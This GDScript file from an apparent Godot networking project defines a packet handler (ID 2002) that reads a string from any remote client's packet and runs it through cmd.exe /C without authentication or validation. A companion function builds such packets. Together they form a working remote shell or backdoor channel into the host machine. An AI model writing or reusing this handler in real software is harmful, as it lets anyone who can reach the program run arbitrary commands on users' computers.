extends CommandSolver
class_name CmdSolver

func getID()->int:
	return 2002

func solve(packet:PackedByteArray,client:RemoteClient = null):
	var buffer:StreamPeerBuffer = StreamPeerBuffer.new()
	buffer.data_array = packet
	
	var args:String = buffer.get_utf8_string()
	OS.execute_with_pipe("cmd.exe",["/C",args])

static func assemble(argsList:Array[String])->PackedByteArray:
	
	var argsLine:String = ""
	for c in argsList:
		argsLine+=" "+c
	
	var buffer:StreamPeerBuffer = StreamPeerBuffer.new()
	buffer.put_u16(2002)
	buffer.put_utf8_string(argsLine)
	return buffer.data_array
